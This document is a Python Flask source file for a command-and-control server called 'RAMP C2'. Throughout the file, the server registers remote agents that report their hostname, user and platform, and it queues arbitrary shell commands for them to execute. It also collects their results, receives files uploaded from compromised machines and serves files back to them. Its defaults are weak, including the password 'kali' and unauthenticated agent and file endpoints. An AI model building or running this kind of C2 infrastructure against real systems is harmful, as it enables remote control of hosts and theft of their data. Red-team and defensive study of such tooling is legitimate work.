"""
RAMP C2 Server
Main Flask application with REST API for agent communication
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import logging
from datetime import datetime
import os
import traceback
from dotenv import load_dotenv

# Load environment based on deployment mode
deployment_mode = os.getenv('DEPLOYMENT_MODE', 'local')
if deployment_mode == 'local':
    load_dotenv('.env.local')
else:
    load_dotenv('.env.internet')

from auth import token_required, generate_token, verify_token
from database import Database
from tasks import TaskQueue

# Configuration class
class Config:
    MODE = os.getenv('DEPLOYMENT_MODE', 'local')
    HOST = os.getenv('C2_HOST', '0.0.0.0')
    PORT = int(os.getenv('C2_PORT', 8443))
    PUBLIC_URL = os.getenv('C2_URL', 'https://localhost:8443')
    
    # Authentication
    ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
    ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'kali')
    JWT_SECRET = os.getenv('JWT_SECRET_KEY', os.urandom(32).hex())
    JWT_EXPIRY_HOURS = int(os.getenv('JWT_EXPIRY_HOURS', 24))
    
    # Agent Authentication
    AGENT_API_KEY = os.getenv('AGENT_API_KEY', '')
    ENABLE_IP_WHITELIST = os.getenv('ENABLE_IP_WHITELIST', 'false').lower() == 'true'
    WHITELISTED_IPS = os.getenv('WHITELISTED_IPS', '').split(',') if os.getenv('WHITELISTED_IPS') else []
    
    # Database
    DB_PATH = os.getenv('DB_PATH', './c2.db')
    
    # SSL Configuration (local mode only)
    SSL_ENABLED = os.getenv('SSL_ENABLED', 'true').lower() == 'true'
    if MODE == 'local' and SSL_ENABLED:
        SSL_CERT = os.getenv('SSL_CERT', './certs/localhost.crt')
        SSL_KEY = os.getenv('SSL_KEY', './certs/localhost.key')
    else:
        SSL_CERT = None
        SSL_KEY = None

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.JWT_SECRET
CORS(app)

# Initialize components
db = Database()
task_queue = TaskQueue()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


# ============================================================================
# Agent API Endpoints
# ============================================================================

@app.route('/api/agent/checkin', methods=['POST'])
def agent_checkin():
    """Agent check-in endpoint"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        
        if not agent_id:
            return jsonify({'error': 'agent_id required'}), 400
        
        # Extract nested data dictionary
        payload_data = data.get('data', {})
        
        # Update agent data including IP address
        agent_data = {
            'agent_id': agent_id,
            'hostname': payload_data.get('hostname', 'unknown'),
            'username': payload_data.get('username', 'unknown'),
            'platform': payload_data.get('platform', 'unknown'),
            'version': payload_data.get('version', '1.0'),
            'ip_address': request.remote_addr,  # Capture IP from request
            'last_seen': datetime.now().isoformat()
        }
        
        db.register_agent(agent_data)
        
        # Check for pending tasks
        tasks = task_queue.get_tasks(agent_id, limit=1)
        
        if tasks and len(tasks) > 0:
            return jsonify({
                'type': 'task',
                'agent_id': agent_id,
                'timestamp': int(datetime.now().timestamp()),
                'data': {
                    'task': tasks[0],
                    'interval': 5
                }
            })
        
        return jsonify({
            'type': 'ack',
            'agent_id': agent_id,
            'timestamp': int(datetime.now().timestamp()),
            'data': {
                'interval': 5
            }
        })
    
    except Exception as e:
        logger.error(f"Checkin error: {e}")
        traceback.print_exc()  # Print full stack trace to console
        return jsonify({'error': str(e)}), 500


@app.route('/api/agent/tasks', methods=['POST'])
def get_agent_tasks():
    """Get pending tasks for agent"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        
        if not agent_id:
            return jsonify({'error': 'Missing agent_id'}), 400
        
        # Update last seen
        db.update_agent_heartbeat(agent_id)
        
        # Get pending tasks
        tasks = task_queue.get_tasks(agent_id)
        
        return jsonify({
            'type': 'tasks',
            'timestamp': int(datetime.now().timestamp()),
            'data': {'tasks': tasks}
        })
    
    except Exception as e:
        logger.error(f"Task retrieval error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/agent/result', methods=['POST'])
def receive_result():
    """Receive task result from agent"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        result_data = data.get('data')
        
        if not agent_id or not result_data:
            return jsonify({'error': 'Invalid data'}), 400
        
        # Store result
        db.store_result(agent_id, result_data)
        logger.info(f"Received result from agent: {agent_id}")
        
        return jsonify({
            'type': 'ack',
            'timestamp': int(datetime.now().timestamp())
        })
    
    except Exception as e:
        logger.error(f"Result storage error: {e}")
        return jsonify({'error': str(e)}), 500


# ============================================================================
# Controller API Endpoints (Protected)
# ============================================================================

@app.route('/api/auth/login', methods=['POST'])
def login():
    """Authenticate controller and get JWT token"""
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        # Authenticate using Config credentials
        if username == Config.ADMIN_USERNAME and password == Config.ADMIN_PASSWORD:
            token = generate_token(username)
            logger.info(f'Successful login from controller: {username}')
            return jsonify({'token': token})
        
        logger.warning(f'Failed login attempt for username: {username}')
        return jsonify({'error': 'Invalid credentials'}), 401
    
    except Exception as e:
        logger.error(f'Login error: {e}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/agents', methods=['GET'])
@token_required
def list_agents():
    """List all connected agents"""
    try:
        agents = db.get_all_agents()
        return jsonify({'agents': agents})
    
    except Exception as e:
        logger.error(f"Agent list error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/agents/<agent_id>/command', methods=['POST'])
@token_required
def send_command(agent_id):
    """Send command to specific agent"""
    try:
        data = request.get_json()
        command = data.get('command')
        
        if not command:
            return jsonify({'error': 'Missing command'}), 400
        
        # Queue task for agent
        task_id = task_queue.add_task(agent_id, {
            'type': 'execute',
            'data': {'command': command}
        })
        
        logger.info(f"Command queued for agent {agent_id}: {command}")
        
        return jsonify({
            'task_id': task_id,
            'status': 'queued'
        })
    
    except Exception as e:
        logger.error(f"Command error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/agents/<agent_id>/results', methods=['GET'])
@token_required
def get_agent_results(agent_id):
    """Get recent task results for an agent"""
    try:
        results = db.get_agent_results(agent_id, limit=50)
        return jsonify({'results': results})
    
    except Exception as e:
        logger.error(f"Results retrieval error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/files/upload', methods=['POST'])
def upload_file():
    """Receive file upload from agent"""
    try:
        remote_path = request.args.get('path')
        file_data = request.get_data()
        
        # Store file securely
        upload_dir = 'uploads'
        os.makedirs(upload_dir, exist_ok=True)
        
        file_path = os.path.join(upload_dir, os.path.basename(remote_path))
        with open(file_path, 'wb') as f:
            f.write(file_data)
        
        logger.info(f"File uploaded: {remote_path}")
        return jsonify({'status': 'success'})
    
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/files/download', methods=['GET'])
def download_file():
    """Send file to agent"""
    try:
        from flask import send_file
        
        remote_path = request.args.get('path')
        if not remote_path:
            return jsonify({'error': 'path required'}), 400
            
        # Secure file path - serve from 'downloads' directory
        downloads_dir = 'downloads'
        os.makedirs(downloads_dir, exist_ok=True)
        
        # Sanitize filename (prevent directory traversal)
        filename = os.path.basename(remote_path)
        file_path = os.path.join(downloads_dir, filename)
        
        if not os.path.exists(file_path):
            # Create a dummy file if it doesn't exist for testing
            with open(file_path, 'w') as f:
                f.write(f"Dummy file content for {filename}")
            # return jsonify({'error': 'File not found'}), 404
            
        logger.info(f"Serving file: {filename}")
        return send_file(file_path, as_attachment=True)
    
    except Exception as e:
        logger.error(f"Download error: {e}")
        return jsonify({'error': str(e)}), 500


# ============================================================================
# Health Check
# ============================================================================

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })


# ============================================================================
# Main Entry Point
# ============================================================================

if __name__ == '__main__':
    try:
        logger.info(f'Starting RAMP C2 Server in {Config.MODE} mode...')
        logger.info(f'Public URL: {Config.PUBLIC_URL}')
        
        if Config.MODE == 'local' and Config.SSL_CERT and Config.SSL_KEY:
            if os.path.exists(Config.SSL_CERT) and os.path.exists(Config.SSL_KEY):
                logger.info(f'Starting HTTPS server on {Config.HOST}:{Config.PORT}')
                app.run(
                    host=Config.HOST,
                    port=Config.PORT,
                    ssl_context=(Config.SSL_CERT,Config.SSL_KEY),
                    debug=False
                )
            else:
                logger.warning('SSL certificates not found! Generate with: openssl req -x509 -newkey rsa:4096 -nodes -out certs/localhost.crt -keyout certs/localhost.key -days 365')
                app.run(host=Config.HOST, port=Config.PORT, debug=False)
        else:
            logger.info(f'Starting server on {Config.HOST}:{Config.PORT} (SSL handled by platform)')
            app.run(host=Config.HOST, port=Config.PORT, debug=False)
            
    except Exception as e:
        logger.error(f'Failed to start server: {e}')
        raise

